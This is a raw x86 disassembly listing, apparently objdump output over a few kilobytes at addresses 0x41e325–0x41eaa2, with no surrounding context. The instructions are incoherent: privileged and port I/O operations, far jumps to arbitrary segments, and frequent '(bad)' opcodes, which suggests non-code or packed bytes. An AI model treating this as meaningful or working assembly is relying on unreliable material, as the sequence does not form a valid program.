  41e325:	mov    bl,0x5
  41e327:	mov    eax,0xcc750fc
  41e32c:	xchg   esi,eax
  41e32d:	fadd   QWORD PTR [edi+ecx*8+0x4b]
  41e331:	std    
  41e332:	and    ecx,ebp
  41e334:	dec    edx
  41e335:	push   esi
  41e336:	add    ah,dl
  41e338:	std    
  41e339:	or     DWORD PTR [esi+0x2d],edx
  41e33c:	jbe    0x41e326
  41e33e:	ret    
  41e33f:	cwde   
  41e340:	data16 mov dh,0x31
  41e343:	xchg   edx,eax
  41e344:	dec    ebx
  41e345:	adc    ebp,ebx
  41e347:	pop    eax
  41e348:	push   ebp
  41e349:	mov    eax,DWORD PTR [ebx-0x3059c06]
  41e34f:	xchg   esi,eax
  41e350:	adc    cl,BYTE PTR [eax+0x5753e02e]
  41e356:	ins    DWORD PTR es:[edi],dx
  41e357:	xor    ebx,DWORD PTR [edx]
  41e359:	sbb    al,0x29
  41e35b:	and    ch,BYTE PTR [edx-0x10]
  41e35e:	repz mov cs,edi
  41e361:	cli    
  41e362:	lea    edx,[ebx+eax*1]
  41e365:	mov    ecx,0x72deac3a
  41e36a:	leave  
  41e36b:	js     0x41e37f
  41e36d:	mov    edi,0x760f7f92
  41e372:	mov    ds:0xbae11d0b,al
  41e377:	in     al,dx
  41e378:	ss mov fs,edi
  41e37b:	and    bl,BYTE PTR [edx-0xc]
  41e37e:	call   0xab3a4028
  41e383:	cdq    
  41e384:	adc    eax,DWORD PTR [ebx+0x7f9478b1]
  41e38a:	mov    al,ds:0x31366601
  41e38f:	xor    ah,BYTE PTR [edx]
  41e391:	xor    ecx,esp
  41e393:	std    
  41e394:	int    0x1e
  41e396:	inc    ecx
  41e397:	jae    0x41e3ed
  41e399:	mov    edi,0x46bcebd7
  41e39e:	outs   dx,DWORD PTR ds:[esi]
  41e39f:	out    0xe0,al
  41e3a1:	mov    ebx,ss
  41e3a3:	mov    WORD PTR [ebp-0x47],fs
  41e3a6:	outs   dx,DWORD PTR ds:[esi]
  41e3a7:	jnp    0x41e35e
  41e3a9:	or     eax,0xa34ffd0
  41e3ae:	cmc    
  41e3af:	or     eax,0x8d4988a4
  41e3b4:	fisttp DWORD PTR [ebx-0x6c]
  41e3b7:	lahf   
  41e3b8:	mov    fs,ebp
  41e3ba:	jmp    0x6031:0x32c99547
  41e3c1:	push   esi
  41e3c2:	popf   
  41e3c3:	dec    eax
  41e3c4:	in     al,dx
  41e3c5:	data16 stc 
  41e3c7:	out    0xa7,al
  41e3c9:	xor    bh,BYTE PTR [esp+ecx*1]
  41e3cc:	jp     0x41e36d
  41e3ce:	add    eax,0x36bfc1ec
  41e3d3:	push   ebp
  41e3d4:	aad    0xe6
  41e3d6:	out    dx,eax
  41e3d7:	rep ins DWORD PTR es:[edi],dx
  41e3d9:	jbe    0x41e409
  41e3db:	or     eax,0xc7397765
  41e3e0:	sub    eax,DWORD PTR [ebp+0x24]
  41e3e3:	in     al,dx
  41e3e4:	inc    ebx
  41e3e5:	les    ecx,FWORD PTR [eax+ebp*4]
  41e3e8:	xor    eax,0x43f52502
  41e3ed:	rol    esp,0x2a
  41e3f0:	pop    ds
  41e3f1:	hlt    
  41e3f2:	jo     0x41e406
  41e3f4:	int3   
  41e3f5:	adc    DWORD PTR [ebp-0x3],esp
  41e3f8:	mov    ah,0x88
  41e3fa:	push   ebp
  41e3fb:	or     eax,0xd0b12a14
  41e400:	(bad)  
  41e401:	stos   BYTE PTR es:[edi],al
  41e402:	and    DWORD PTR [edi+0x75],0x62bc260b
  41e409:	sahf   
  41e40a:	mov    ah,0xdd
  41e40c:	mov    ds:0x85643539,eax
  41e411:	pop    ds
  41e412:	cs mov edx,0xf4946d39
  41e418:	jg     0x41e3ba
  41e41a:	xor    al,0x60
  41e41c:	adc    edx,ebx
  41e41e:	outs   dx,BYTE PTR ds:[esi]
  41e41f:	mov    esp,0xfb802811
  41e424:	pop    ds
  41e425:	(bad)  
  41e426:	les    ebp,FWORD PTR [esi]
  41e428:	cmp    DWORD PTR [ebp-0x20],ebp
  41e42b:	jnp    0x41e447
  41e42d:	jns    0x41e4a8
  41e42f:	(bad)  
  41e430:	jae    0x41e3ca
  41e432:	stos   DWORD PTR es:[edi],eax
  41e433:	add    bh,BYTE PTR [esp+ebp*4]
  41e436:	sbb    DWORD PTR [edx],ebp
  41e438:	mov    ah,0x4
  41e43a:	ss fs sub al,0x19
  41e43e:	add    ecx,eax
  41e440:	xchg   esi,eax
  41e441:	es push 0x68
  41e444:	aaa    
  41e445:	dec    ecx
  41e446:	jmp    0x65c0:0xbf559627
  41e44d:	pop    ecx
  41e44e:	ja     0x41e476
  41e450:	xor    dh,dh
  41e452:	xchg   edx,eax
  41e453:	inc    esi
  41e454:	fsubr  st(5),st
  41e456:	sub    ah,bl
  41e458:	pop    ebx
  41e459:	mov    edi,0xed7db7ff
  41e45e:	jae    0x41e4b0
  41e460:	leave  
  41e461:	pop    eax
  41e462:	imul   ecx,DWORD PTR [ecx],0xffffff95
  41e465:	lds    ebx,FWORD PTR [ebp+0x2cfe87c7]
  41e46b:	sub    al,0xbb
  41e46d:	mov    cl,0x42
  41e46f:	or     eax,0x7e2330de
  41e474:	add    edx,esp
  41e476:	popa   
  41e477:	icebp  
  41e478:	jns    0x41e401
  41e47a:	imul   ebp,DWORD PTR [esi+0x3],0xffffff88
  41e47e:	inc    ebp
  41e47f:	test   DWORD PTR [edi+esi*4],edx
  41e482:	ret    0x6175
  41e485:	mov    ah,0xd5
  41e487:	pop    edi
  41e488:	mov    dl,0x5a
  41e48a:	xchg   DWORD PTR [esp+ebx*2+0x4bf5bece],edi
  41e491:	xor    DWORD PTR [ecx+eiz*1+0x22],ebx
  41e495:	push   esp
  41e496:	jo     0x41e45d
  41e498:	push   edi
  41e499:	add    esi,DWORD PTR [eax]
  41e49b:	jp     0x41e48d
  41e49d:	and    bl,BYTE PTR [edi-0x1a1a36c9]
  41e4a3:	or     bl,0x4c
  41e4a6:	and    al,0xd8
  41e4a8:	and    ch,BYTE PTR [esi+0x2ebb9e49]
  41e4ae:	iret   
  41e4af:	add    esp,ecx
  41e4b1:	push   cs
  41e4b2:	push   ds
  41e4b3:	out    dx,eax
  41e4b4:	jno    0x41e485
  41e4b6:	mov    ah,0xcf
  41e4b8:	shl    DWORD PTR [ecx+0x7f952455],0x72
  41e4bf:	cmp    DWORD PTR [eax-0x6d],0x5e
  41e4c3:	(bad)  
  41e4c4:	ds nop
  41e4c6:	push   esi
  41e4c7:	in     eax,0x80
  41e4c9:	xor    DWORD PTR [eax],ebp
  41e4cb:	xor    eax,0x22ebfa95
  41e4d0:	add    al,0xa6
  41e4d2:	push   es
  41e4d3:	cld    
  41e4d4:	pop    ecx
  41e4d5:	xor    al,0xf3
  41e4d7:	mov    ebp,DWORD PTR [esi+0x40]
  41e4da:	mov    esp,0xab28578e
  41e4df:	sub    edx,DWORD PTR [eax+ebx*8-0x38]
  41e4e3:	xchg   DWORD PTR [ebx],ecx
  41e4e5:	fisttp QWORD PTR [esi+esi*4+0x2]
  41e4e9:	sti    
  41e4ea:	add    ah,BYTE PTR [edx*4-0x5b4df7d]
  41e4f1:	ret    0x24c4
  41e4f4:	pop    eax
  41e4f5:	lgdtd  [ebx]
  41e4f8:	jae    0x41e4ae
  41e4fa:	sub    al,0x6b
  41e4fc:	jle    0x41e4b9
  41e4fe:	retf   
  41e4ff:	lods   eax,DWORD PTR ds:[esi]
  41e500:	(bad)  
  41e501:	cs inc ebp
  41e503:	sub    al,0xcd
  41e505:	daa    
  41e506:	sahf   
  41e507:	inc    esi
  41e508:	add    BYTE PTR [eiz*4+0x5952ca2d],0xb9
  41e510:	in     eax,dx
  41e511:	jge    0x41e56f
  41e513:	out    dx,eax
  41e514:	push   ds
  41e515:	sti    
  41e516:	bound  ecx,QWORD PTR [edi-0x7e]
  41e519:	xor    DWORD PTR [ecx],ebx
  41e51b:	dec    esi
  41e51c:	mov    al,0x84
  41e51e:	push   esi
  41e51f:	push   eax
  41e520:	lods   al,BYTE PTR ds:[esi]
  41e521:	rcl    BYTE PTR ss:[esi-0x31],0xbc
  41e526:	push   cs
  41e527:	loopne 0x41e543
  41e529:	dec    esp
  41e52a:	loop   0x41e53c
  41e52c:	ins    DWORD PTR es:[edi],dx
  41e52d:	jmp    0xc4a0:0x536f042b
  41e534:	mov    ebx,DWORD PTR [eax+edi*4+0x16784d37]
  41e53b:	push   ss
  41e53c:	add    eax,0xd833e25a
  41e541:	mov    esp,0x234ca826
  41e546:	xor    al,BYTE PTR [edx]
  41e548:	ficomp DWORD PTR [edi+0x5f6d118]
  41e54e:	ins    DWORD PTR es:[edi],dx
  41e54f:	stos   BYTE PTR es:[edi],al
  41e550:	jecxz  0x41e4ed
  41e552:	fs in  al,dx
  41e554:	dec    edx
  41e555:	and    ch,BYTE PTR [edx-0x5713e5d2]
  41e55b:	pop    ds
  41e55c:	push   cs
  41e55d:	push   ebp
  41e55e:	mov    bl,0x8
  41e560:	inc    eax
  41e561:	mov    esi,0xc4b85782
  41e566:	mov    esi,0x6162bf98
  41e56b:	stos   BYTE PTR es:[edi],al
  41e56c:	mov    ss,WORD PTR [ebp+ecx*4+0x32]
  41e570:	sbb    al,0x35
  41e572:	dec    ax
  41e574:	and    cl,BYTE PTR [ecx+0x2e]
  41e577:	js     0x41e562
  41e579:	pop    es
  41e57a:	sub    eax,edx
  41e57c:	sub    ch,BYTE PTR [esi+edi*8]
  41e57f:	jb     0x41e55f
  41e581:	fidivr DWORD PTR [edx-0x4c5f2d8e]
  41e587:	stc    
  41e588:	mov    esp,0x794431ab
  41e58d:	(bad)  
  41e58e:	ins    DWORD PTR es:[edi],dx
  41e58f:	add    BYTE PTR [edi+0x5e564a1],0x59
  41e596:	sub    edx,esi
  41e598:	sub    DWORD PTR [esi],0x9e9cdd72
  41e59e:	repz push ebp
  41e5a0:	mov    ds:0x9679a92f,eax
  41e5a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5a6:	sahf   
  41e5a7:	jns    0x41e5bc
  41e5a9:	(bad)  
  41e5aa:	pop    esp
  41e5ab:	sub    eax,0x6d8fa7f5
  41e5b0:	call   0x3f6:0x53ae19df
  41e5b7:	sahf   
  41e5b8:	dec    ebx
  41e5b9:	adc    BYTE PTR [edx],ch
  41e5bb:	cdq    
  41e5bc:	sbb    BYTE PTR [esi-0x3f570613],bh
  41e5c2:	sbb    DWORD PTR [edi+0x22],edi
  41e5c5:	and    eax,0x5e99fd20
  41e5ca:	cmp    DWORD PTR [ecx],esi
  41e5cc:	cmp    BYTE PTR [edi],ch
  41e5ce:	xor    dl,BYTE PTR ds:0xcdc4dab
  41e5d4:	jg     0x41e612
  41e5d6:	mov    al,0x40
  41e5d8:	das    
  41e5d9:	mov    al,ds:0x51a545f5
  41e5de:	addr16 xchg ebx,eax
  41e5e0:	cmp    ch,BYTE PTR [eax+0x51]
  41e5e3:	jae    0x41e5fa
  41e5e5:	xchg   ebx,eax
  41e5e6:	or     al,0x4e
  41e5e8:	data16 adc BYTE PTR [edx-0x6cf8df9f],dl
  41e5ef:	jecxz  0x41e65b
  41e5f1:	adc    BYTE PTR [eax-0x5ed1434e],al
  41e5f7:	sbb    DWORD PTR [ebx-0x48],edi
  41e5fa:	popf   
  41e5fb:	imul   ebp,DWORD PTR [edx-0x6f],0xb87f3f85
  41e602:	mov    ebp,0x7c87aa71
  41e607:	in     al,dx
  41e608:	xor    dl,dh
  41e60a:	ss cmp ch,bl
  41e60d:	call   0x8291efc5
  41e612:	inc    esi
  41e613:	or     BYTE PTR [ebp+0xf2dfcc9],al
  41e619:	mov    edx,0xc8451371
  41e61e:	mov    esi,0x74a479ed
  41e623:	add    al,0x44
  41e625:	inc    ebp
  41e626:	int    0x49
  41e628:	stos   BYTE PTR es:[edi],al
  41e629:	fidiv  WORD PTR [ecx]
  41e62b:	cmp    ch,BYTE PTR [ecx+0x5f]
  41e62e:	mov    ah,0x5b
  41e630:	add    al,0x98
  41e632:	cli    
  41e633:	xchg   edx,eax
  41e634:	or     al,0xd0
  41e636:	inc    esp
  41e637:	and    ebx,DWORD PTR [ebp+0x5b]
  41e63a:	push   esp
  41e63b:	mov    ebx,0x641ad1ab
  41e641:	icebp  
  41e642:	lods   al,BYTE PTR ds:[esi]
  41e643:	add    DWORD PTR [esi+ebx*4],edx
  41e646:	push   0x8d7cf206
  41e64b:	repz push ebx
  41e64d:	cmp    ebp,DWORD PTR [ecx]
  41e64f:	aaa    
  41e650:	cmp    DWORD PTR [ebx],eax
  41e652:	jb     0x41e5d4
  41e654:	dec    ecx
  41e655:	jp     0x41e6d2
  41e657:	mov    esi,0xa6ba342a
  41e65c:	adc    DWORD PTR [esi+0x613821c5],eax
  41e662:	clc    
  41e663:	icebp  
  41e664:	sbb    al,0x47
  41e666:	stc    
  41e667:	cmp    DWORD PTR [edx+0x2ff9e20b],ecx
  41e66d:	adc    esi,DWORD PTR [esi]
  41e66f:	sub    cl,dh
  41e671:	shr    DWORD PTR [edx+0x14],0xdf
  41e675:	xor    al,0x8d
  41e677:	je     0x41e602
  41e679:	push   ss
  41e67a:	(bad)  
  41e67c:	daa    
  41e67d:	jle    0x41e6fd
  41e67f:	and    ebx,ebp
  41e681:	pop    ds
  41e682:	rcl    BYTE PTR [edx],cl
  41e684:	xor    BYTE PTR [edx],dl
  41e686:	leave  
  41e687:	mov    bl,BYTE PTR [eax+0x4c]
  41e68a:	and    eax,0x5991191e
  41e68f:	paddusw mm4,mm2
  41e692:	jmp    0xb1f7e9d8
  41e697:	push   ecx
  41e698:	ret    0x5092
  41e69b:	les    eax,FWORD PTR ds:0x5ba7ddcd
  41e6a1:	cdq    
  41e6a2:	inc    eax
  41e6a3:	jo     0x41e713
  41e6a5:	test   eax,0x9e44dacb
  41e6aa:	repnz or DWORD PTR [ebx+0x14],eax
  41e6ae:	mov    BYTE PTR [ecx],cl
  41e6b0:	(bad)  
  41e6b1:	fsub   DWORD PTR [edi+0x6a9b271]
  41e6b7:	mov    al,ds:0xe73ee032
  41e6bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6bd:	jmp    0x340a21d9
  41e6c2:	(bad)  
  41e6c3:	enter  0xf315,0x36
  41e6c7:	adc    BYTE PTR ds:0x85c60c4,bh
  41e6cd:	mov    ds:0x19dacd1e,al
  41e6d2:	fidiv  DWORD PTR [esi-0x2e295651]
  41e6d8:	cmp    al,0xc0
  41e6da:	lods   eax,DWORD PTR ds:[esi]
  41e6db:	mov    DWORD PTR [ebx+0x7b],esp
  41e6de:	fst    QWORD PTR ds:[eax-0x15ebab0]
  41e6e5:	jg     0x41e6a5
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	scas   eax,DWORD PTR es:[edi]
  41e6e9:	(bad)  
  41e6ea:	push   ebp
  41e6eb:	xrelease mov BYTE PTR [edx+0x9],cl
  41e6ef:	(bad)  
  41e6f0:	push   esp
  41e6f1:	sub    edi,edx
  41e6f3:	addr16 popa 
  41e6f5:	int3   
  41e6f6:	fst    DWORD PTR [eax+0x747025ad]
  41e6fc:	lock aad 0xf1
  41e6ff:	or     DWORD PTR [eax],0xd5533d7f
  41e705:	jne    0x41e70b
  41e707:	je     0x41e6a8
  41e709:	cmp    al,0xd4
  41e70b:	mov    esi,0x82c711ee
  41e710:	popf   
  41e711:	and    ebx,DWORD PTR [edx+0x39]
  41e714:	rol    al,1
  41e716:	jbe    0x41e6b0
  41e718:	cmp    al,0x2d
  41e71a:	mov    dl,0x7
  41e71c:	fsubrp st(5),st
  41e71e:	loop   0x41e712
  41e720:	cmp    DWORD PTR [ebp-0x6732b9bc],ebx
  41e726:	ins    BYTE PTR es:[edi],dx
  41e727:	adc    BYTE PTR [edx],0xb0
  41e72a:	sub    al,0x8e
  41e72c:	sti    
  41e72d:	xor    edx,eax
  41e72f:	and    esp,DWORD PTR [ecx]
  41e731:	cmp    eax,0xe0e9f17e
  41e736:	pop    edx
  41e737:	jmp    0x41e73b
  41e739:	adc    BYTE PTR [edi+ebx*8+0x0],dh
  41e73d:	outs   dx,DWORD PTR ds:[esi]
  41e73e:	aad    0x72
  41e740:	add    ch,BYTE PTR [edi-0x28]
  41e743:	dec    edx
  41e744:	push   ebp
  41e745:	sub    eax,0x7cffe749
  41e74a:	cmp    ch,bh
  41e74c:	ja     0x41e7b5
  41e74e:	jl     0x41e734
  41e750:	mov    WORD PTR [ebx-0x1fb044b],fs
  41e756:	xchg   DWORD PTR [edx-0x30],edi
  41e759:	xchg   ebx,esi
  41e75b:	stos   DWORD PTR es:[edi],eax
  41e75c:	push   edi
  41e75d:	adc    eax,0xb2b60cd5
  41e762:	mov    esp,0xc0bb773b
  41e767:	mov    edx,0xd44bc51
  41e76c:	adc    al,cl
  41e76e:	lahf   
  41e76f:	push   edi
  41e770:	dec    esp
  41e771:	dec    ebx
  41e772:	inc    eax
  41e773:	dec    ebp
  41e774:	into   
  41e775:	fwait
  41e776:	sub    dl,ah
  41e778:	add    al,0x40
  41e77a:	int3   
  41e77b:	mov    DWORD PTR [ecx-0x2c],eax
  41e77e:	inc    ecx
  41e77f:	pop    ds
  41e780:	dec    eax
  41e781:	mov    dl,0x9c
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	stc    
  41e785:	and    al,BYTE PTR [esi+0x27]
  41e788:	mov    ebp,0x70370213
  41e78d:	jmp    0x41e7c9
  41e78f:	dec    BYTE PTR [ebx-0x5f]
  41e792:	push   es
  41e793:	(bad)  
  41e794:	xchg   edi,eax
  41e795:	ds inc edi
  41e797:	out    0x18,eax
  41e799:	les    edi,FWORD PTR [edx-0xf]
  41e79c:	shl    BYTE PTR [eax+0xa],0x2a
  41e7a0:	add    BYTE PTR [esi+ebx*8-0x4e],cl
  41e7a4:	neg    DWORD PTR [edx+0x3f434c94]
  41e7aa:	(bad)  
  41e7ab:	ins    DWORD PTR es:[edi],dx
  41e7ac:	xchg   esp,eax
  41e7ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7ae:	gs pop ss
  41e7b0:	jl     0x41e77b
  41e7b2:	fimul  WORD PTR [edi+0x0]
  41e7b5:	test   BYTE PTR [ebx],ah
  41e7b7:	push   esi
  41e7b8:	sahf   
  41e7b9:	int    0xf
  41e7bb:	jae    0x41e7a1
  41e7bd:	mov    ch,0xbc
  41e7bf:	(bad)  [ebp-0x75a74f32]
  41e7c5:	call   0xe739:0xb9c04fef
  41e7cc:	pop    esp
  41e7cd:	sub    ecx,eax
  41e7cf:	rcl    edx,1
  41e7d1:	sbb    BYTE PTR [eax-0x65],0x12
  41e7d5:	data16 ss inc bh
  41e7d9:	test   DWORD PTR [esi],0xef42504d
  41e7df:	pop    ebx
  41e7e0:	shl    DWORD PTR [esi-0x62],cl
  41e7e3:	fwait
  41e7e4:	push   cs
  41e7e5:	pop    es
  41e7e6:	addr16 icebp 
  41e7e8:	xor    BYTE PTR [edx+0x661bb26f],al
  41e7ee:	test   ebp,ecx
  41e7f0:	mov    bl,0x2
  41e7f2:	(bad)  
  41e7f3:	fldcw  WORD PTR [ebx+edi*8-0x45]
  41e7f7:	and    al,BYTE PTR [ebx-0x50b5846a]
  41e7fd:	scas   al,BYTE PTR es:[edi]
  41e7fe:	scas   al,BYTE PTR es:[edi]
  41e7ff:	add    BYTE PTR [esi-0x4b188937],0xf
  41e806:	adc    al,0xe0
  41e808:	fwait
  41e809:	sub    DWORD PTR [edi-0x1],ebx
  41e80c:	(bad)  
  41e80d:	in     eax,dx
  41e80e:	jae    0x41e86c
  41e810:	ins    BYTE PTR es:[edi],dx
  41e811:	ins    DWORD PTR es:[edi],dx
  41e812:	adc    ah,BYTE PTR [eax+0x3c60a46e]
  41e818:	cli    
  41e819:	cmp    al,0xba
  41e81b:	xchg   esp,eax
  41e81c:	xor    ecx,0x6017e45e
  41e822:	push   edx
  41e823:	and    BYTE PTR [eax+0x1d],dh
  41e826:	in     al,0x9
  41e828:	pusha  
  41e829:	test   BYTE PTR [ecx],al
  41e82b:	hlt    
  41e82c:	xchg   edx,eax
  41e82d:	shl    DWORD PTR [edx-0x50],1
  41e830:	jge    0x41e8a1
  41e832:	xchg   ebp,eax
  41e833:	adc    ecx,DWORD PTR [ebp-0x13]
  41e836:	xchg   edx,eax
  41e837:	inc    esi
  41e838:	fistp  QWORD PTR [ebp-0x6f4ecd66]
  41e83e:	scas   eax,DWORD PTR es:[edi]
  41e83f:	mov    eax,0xed2d0cb9
  41e844:	fs je  0x41e877
  41e847:	fdivr  QWORD PTR [ebx+0x7a1226f4]
  41e84d:	sbb    DWORD PTR [ebp-0x7d],edx
  41e850:	stos   BYTE PTR es:[edi],al
  41e851:	int    0x15
  41e853:	lahf   
  41e854:	pop    ss
  41e855:	add    dl,BYTE PTR [ebx+0x21de1b2c]
  41e85b:	xchg   ah,dl
  41e85d:	retf   0xf502
  41e860:	lahf   
  41e861:	lods   eax,DWORD PTR ds:[esi]
  41e862:	mov    al,0xd9
  41e864:	imul   esp,DWORD PTR ds:0xec912461,0xa26a0963
  41e86e:	mov    ebx,eax
  41e870:	mov    eax,0xcb14a331
  41e875:	adc    eax,0xb2b9bffa
  41e87a:	fdivr  DWORD PTR cs:[eax+ebp*2-0x5a945a1f]
  41e882:	inc    ecx
  41e883:	sub    bl,dh
  41e885:	loope  0x41e901
  41e887:	mov    al,0x9d
  41e889:	xor    BYTE PTR [edx],bh
  41e88b:	xor    eax,DWORD PTR [ebp-0x71]
  41e88e:	fld    DWORD PTR ds:0xa77583b3
  41e894:	das    
  41e895:	mov    ecx,0xb41a7082
  41e89a:	in     eax,dx
  41e89b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e89c:	retf   0x95e4
  41e89f:	leave  
  41e8a0:	pop    ds
  41e8a1:	jmp    0x30cb:0xb182245c
  41e8a8:	shl    BYTE PTR ds:0xee220f8,cl
  41e8ae:	scas   al,BYTE PTR es:[edi]
  41e8af:	jp     0x41e83e
  41e8b1:	dec    ebx
  41e8b2:	cwde   
  41e8b3:	fdiv   DWORD PTR [ebx-0x66]
  41e8b6:	enter  0x8763,0x12
  41e8ba:	mov    ds:0x9f98527,al
  41e8bf:	push   edx
  41e8c0:	sbb    ch,BYTE PTR [eax]
  41e8c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8c3:	into   
  41e8c4:	leave  
  41e8c5:	imul   edi,DWORD PTR [ebx],0x5c1dfbe6
  41e8cb:	xchg   ecx,eax
  41e8cc:	lods   al,BYTE PTR ds:[esi]
  41e8cd:	cmc    
  41e8ce:	inc    edx
  41e8cf:	(bad)  
  41e8d0:	jo     0x41e8d5
  41e8d2:	jne    0x41e953
  41e8d4:	sbb    eax,0xfc71779
  41e8d9:	lods   al,BYTE PTR ds:[esi]
  41e8da:	push   cs
  41e8db:	out    dx,al
  41e8dc:	pop    ebp
  41e8dd:	fwait
  41e8de:	ja     0x41e8da
  41e8e0:	data16 in al,dx
  41e8e2:	ss push esp
  41e8e4:	jo     0x41e899
  41e8e6:	and    esp,DWORD PTR [ebx]
  41e8e8:	and    bh,BYTE PTR [esi-0x271c9161]
  41e8ee:	fadd   st(0),st
  41e8f0:	xor    BYTE PTR [edi-0x7fc0dd87],ah
  41e8f6:	xchg   DWORD PTR [eax-0x40],esp
  41e8f9:	push   esi
  41e8fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8fb:	popf   
  41e8fc:	push   edi
  41e8fd:	addr16 loopne 0x41e8fa
  41e900:	xchg   esp,eax
  41e901:	mov    gs,WORD PTR [edi]
  41e903:	jo     0x41e97a
  41e905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e906:	lods   eax,DWORD PTR ds:[esi]
  41e907:	pop    esp
  41e908:	icebp  
  41e909:	(bad)  
  41e90a:	fstp   TBYTE PTR [ebp+0x3ad1be]
  41e910:	xchg   BYTE PTR [edx-0xf],al
  41e913:	(bad)  
  41e914:	xor    dh,BYTE PTR [ecx]
  41e916:	mov    ecx,0xb5e76685
  41e91b:	push   ecx
  41e91c:	jne    0x41e94e
  41e91e:	fstp   DWORD PTR [ebx+0x1e]
  41e921:	push   ebx
  41e922:	xchg   DWORD PTR [edi+eax*2+0x3a],ebx
  41e926:	mov    BYTE PTR [eax+ecx*2-0x51d7ae6b],0xcf
  41e92e:	mov    dl,0x1
  41e930:	or     eax,0x8302aa33
  41e935:	mov    WORD PTR [edi-0x5a8a06a2],?
  41e93b:	dec    edi
  41e93c:	in     eax,dx
  41e93d:	add    BYTE PTR [esi],bh
  41e93f:	je     0x41e9ab
  41e941:	mul    DWORD PTR [ecx+esi*8]
  41e944:	out    0x4d,al
  41e946:	test   bl,bl
  41e948:	lea    ebp,ds:0xf4bebc2c
  41e94e:	fwait
  41e94f:	adc    cl,BYTE PTR es:[ecx+0x6b]
  41e953:	xor    BYTE PTR [ecx],bh
  41e955:	mov    BYTE PTR [edx],dh
  41e957:	and    ecx,DWORD PTR [ebx]
  41e959:	jmp    0x41e95c
  41e95b:	fwait
  41e95c:	clc    
  41e95d:	mov    ebp,0x2a97bf92
  41e962:	mov    WORD PTR [ebp-0x13],?
  41e965:	jmp    0x19aab9cd
  41e96a:	out    0x35,eax
  41e96c:	mov    cs,WORD PTR [esi]
  41e96e:	and    cl,BYTE PTR [ebx+0x6bedf76b]
  41e974:	daa    
  41e975:	frstor [ebp-0x60e94cf9]
  41e97b:	lods   al,BYTE PTR ds:[esi]
  41e97c:	in     eax,dx
  41e97d:	test   BYTE PTR [ecx+0x30],dh
  41e980:	pushf  
  41e981:	jge    0x41e97a
  41e983:	cmp    al,0x28
  41e985:	aad    0xd1
  41e987:	jbe    0x41e95c
  41e989:	cmp    DWORD PTR [edi],eax
  41e98b:	fdivr  DWORD PTR [eax]
  41e98d:	idiv   DWORD PTR [ebx+0x67633593]
  41e993:	mul    BYTE PTR [ecx]
  41e995:	mov    ecx,0x3f6b08c4
  41e99a:	(bad)  
  41e99c:	(bad)  
  41e99d:	retf   
  41e99e:	or     eax,0xd03f1770
  41e9a3:	pusha  
  41e9a4:	push   edi
  41e9a5:	push   0x9ce8e326
  41e9aa:	pop    ebp
  41e9ab:	xor    BYTE PTR [ebp-0x37a72b5c],bl
  41e9b1:	mov    ch,0x5b
  41e9b3:	ret    
  41e9b4:	sbb    al,0xc7
  41e9b6:	mov    ecx,0x5956eaaf
  41e9bb:	je     0x41e997
  41e9bd:	and    al,BYTE PTR [esi]
  41e9bf:	sub    esi,DWORD PTR [esi]
  41e9c1:	xor    ecx,DWORD PTR [edx+0x45cd0e03]
  41e9c7:	jp     0x41e97f
  41e9c9:	cmp    al,0xcc
  41e9cb:	out    dx,eax
  41e9cc:	jnp    0x41ea4d
  41e9ce:	retf   0x4fb3
  41e9d1:	mov    ds:0x902d3365,al
  41e9d7:	shr    BYTE PTR [eax+eax*4-0x382871c4],1
  41e9de:	cs test eax,0x1c5a157d
  41e9e4:	add    al,0x5e
  41e9e6:	push   edx
  41e9e7:	or     ah,bh
  41e9e9:	jo     0x41e9e1
  41e9eb:	cs sbb eax,0x14b52fa0
  41e9f1:	xchg   ecx,eax
  41e9f2:	push   edi
  41e9f3:	lds    ebx,FWORD PTR [ecx-0x55a4a9a9]
  41e9f9:	(bad)  
  41e9fa:	shl    esp,cl
  41e9fc:	mov    eax,fs
  41e9fe:	std    
  41e9ff:	push   0x15711618
  41ea04:	shr    BYTE PTR [ebx+0x246a4c18],cl
  41ea0a:	(bad)  
  41ea0b:	call   0xa92e:0xc3c22d3b
  41ea12:	fcom   QWORD PTR [ebx+0x21d6d1c7]
  41ea18:	mov    edx,esi
  41ea1a:	push   ebp
  41ea1b:	xor    eax,0x75e9f82e
  41ea20:	xchg   esi,eax
  41ea21:	push   es
  41ea22:	or     BYTE PTR [esi+0x5e],cl
  41ea25:	push   ecx
  41ea26:	cwde   
  41ea27:	into   
  41ea28:	stos   BYTE PTR es:[edi],al
  41ea29:	aaa    
  41ea2a:	add    BYTE PTR [ebx+0x14585f8f],0xd6
  41ea31:	jle    0x41ea12
  41ea33:	dec    ecx
  41ea34:	iret   
  41ea35:	sub    esp,DWORD PTR [esi+0x40361626]
  41ea3b:	or     DWORD PTR [edi],0xfc4af337
  41ea41:	aas    
  41ea42:	pushf  
  41ea43:	jne    0x41eabe
  41ea45:	mov    eax,0x8ca8c09a
  41ea4a:	pop    ax
  41ea4c:	xor    ebp,edi
  41ea4e:	cmp    ah,ah
  41ea50:	gs jne 0x41eaaf
  41ea53:	leave  
  41ea54:	sbb    DWORD PTR [ebx],edi
  41ea56:	push   ss
  41ea57:	push   cs
  41ea58:	sbb    BYTE PTR [ebx+0x506c2f95],ah
  41ea5e:	jle    0x41ead4
  41ea60:	adc    ecx,DWORD PTR [ecx]
  41ea62:	or     DWORD PTR [edi+0x2832975e],eax
  41ea68:	jbe    0x41eae1
  41ea6a:	jnp    0x41ea03
  41ea6c:	test   al,0x46
  41ea6e:	or     al,0xcc
  41ea70:	pop    ebx
  41ea71:	out    dx,eax
  41ea72:	jp     0x41eae9
  41ea74:	mov    edx,0x5bc900a9
  41ea79:	fdiv   DWORD PTR [ebx+0x4b]
  41ea7c:	add    BYTE PTR [eax-0xac1c1f3],0x7c
  41ea83:	jp     0x41ea42
  41ea85:	test   DWORD PTR [ebp+0x3418595d],esi
  41ea8b:	cwde   
  41ea8c:	push   ecx
  41ea8d:	pop    ss
  41ea8e:	mov    ds:0x98ca200,al
  41ea93:	sub    al,0x78
  41ea95:	sub    cl,BYTE PTR ds:0xbd1846b6
  41ea9b:	push   cs
  41ea9c:	sti    
  41ea9d:	mov    ds:0x58cf960a,al
  41eaa2:	sti    
